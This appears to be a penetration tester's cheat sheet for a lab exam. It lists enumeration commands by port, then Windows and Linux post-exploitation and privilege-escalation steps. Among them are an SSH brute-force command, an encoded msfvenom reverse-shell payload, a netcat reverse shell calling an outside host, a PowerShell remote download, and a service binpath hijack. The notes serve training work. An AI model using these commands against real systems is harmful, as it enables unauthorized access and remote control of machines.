# Initial Reconnaissance:
Main Nmap Scan: nmap -v -A -sS 10.11.1.X

Alternate Connect Scan: nmap -v -sT -p 0-10000 10.11.1.X

# Ports and Services:
# 21: FTP
		
Methods and Tools:
Notes:
Service version research
Google / ExploitDB from nmap scan
netcat/telnet interaction
nc 10.11.1.X 21  Commands: https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands 
Nmap NSE FTP scripts
nmap -v 10.11.1.X --script “ftp*”
dotdotpwn
dotdotpwn -h 10.11.1.X -m ftp

# 22: SSH

Methods and Tools:
Notes:
Service version research
It’s almost never ssh, ExploitDB/Google 
hydra
Hydra -l user -P /usr/share/wordlists/rockyou.gz 10.11.1.X SSH


# 25: SMTP

Methods and Tools:
Notes: 
Service version research
ExploitDB/Google
Nmap NSE scripts
nmap -v 10.11.1.X --script “smtp*”
smtp-user-enum
smtp-user-enum -u username -U usernamelist.txt -t 10.11.1.X


# 53: DNS
	
Methods and Tools:
Notes:
Service version research
ExploitDB/Google
Nmap NSE scripts
nmap -v 10.11.1.X --script “dns*”
DNSenum
dnsenum URL.com


# 80/443/8080: HTTP/HTTPS

Methods and Tools:
Notes:
Service version research
ExploitDB/Google
Nmap NSE scripts
nmap -v 10.11.1.X --script “http*”
Dirbuster
GUI, /usr/share/wordlists/dirbuster
nikto
Nikto -h 10.11.1.X
Burpsuite
Webproxy, set up for Iceweasel
Curl
Data transfer, not as useful
Cadaver/davtest
Useful for webDAV stuff, more specific
Wpscan
Only for wordpress


# 110: POP3
	
Methods and Tools:
Notes:
Service version research
ExploitDB/Google
Nmap NSE scripts
nmap -v 10.11.1.X --script “pop*”
Netcat/telnet interaction
nc 10.11.1.X 110





# 135: RPC
	
Methods and Tools:
Notes:
Service version research
ExploitDB/Google
Nmap NSE scripts
nmap -v 10.11.1.X --script “rpc*”
enum4linux
enum4linux 10.11.1.X
rpcclient
rpcclient -U “” 10.11.1.X for null session

	
# 139: NETBIOS
	
Methods and Tools:
Notes:
Service version research
ExploitDB/Google
nbtscan
nbtscan -v 10.11.1.X
enum4linux
enum4linux 10.11.1.X


# 445: SMB
	
Methods and Tools:
Notes:
Service version research
ExploitDB/Google
Nmap NSE scripts
nmap -v 10.11.1.X --script “smb*”
enum4linux
enum4linux 10.11.1.X
smbclient
smbclient "//10.11.1.128/wwwroot" - Connects to smb shares mapped with enum4linux
smbmap
smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
nbtscan
nbtscan -v 10.11.1.X




## Windows Post-Exploitation
	
General Toolkit
Method and Tools:
Notes and Links: 
Powershell File Download
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.243/test.txt','C:\test.txt)”
General File Transfer
https://blog.ropnop.com/transferring-files-from-kali-to-windows/ 
Mingw Compiling for Windows
i686-w64-mingw32-g++ -o evil.exe 37098.txt -lws2_32
Dos2unix (Gets rid of /bin/sh^5 error)
dos2unix <filename> 
Payload Encoding (On Kali) 
msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.243 LPORT=1777 -f exe -o rever.exe -e x86/shikata_ga_nai -k
Windows netcat reverse shell
nc.exe 192.168.100.113 4444 –e cmd.exe


# Privilege Escalation
	
Method and Tools:
Notes and Links:
General Guide
http://www.fuzzysecurity.com/tutorials/16.html 
Accesschk.exe
https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk 
Windows Enum
https://github.com/azmatt/windowsEnum 
WinExpSugg
https://github.com/GDSSecurity/Windows-Exploit-Suggester 
WinPrivChk
https://github.com/pentestmonkey/windows-privesc-check 
Service Privesc
sc config SSDPSRV start= “auto”
net start SSDPSRV
net start UPNPHOST
sc config upnphost binpath= “C:\shell.exe”
sc config upnphost obj= “.\LocalSystem” password= “”
net start upnphost




## Linux Post-Exploitation

General Toolkit:
Method and Tools:
Notes and Links:
Shell Cheatsheet
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
Shell Escape
python -c 'import pty; pty.spawn("/bin/sh")'  
File Transfer
https://www.pks.mpg.de/~mueller/docs/suse10.2/html/opensuse-manual_en/manual/sec.filetrans.copy.html 
Exploit/multi/handler
Set payload
Set LPORT
Set LHOST
Set EXITFUNC


# Privilege Escalation:

Method and Tools:
Notes and Links:
General Guide
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
Exploit Suggester
https://github.com/mzet-/linux-exploit-suggester 
LinEnum*
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 
Unix Privesc Check
https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh 
LinPrivChecker
https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py

	
	
	

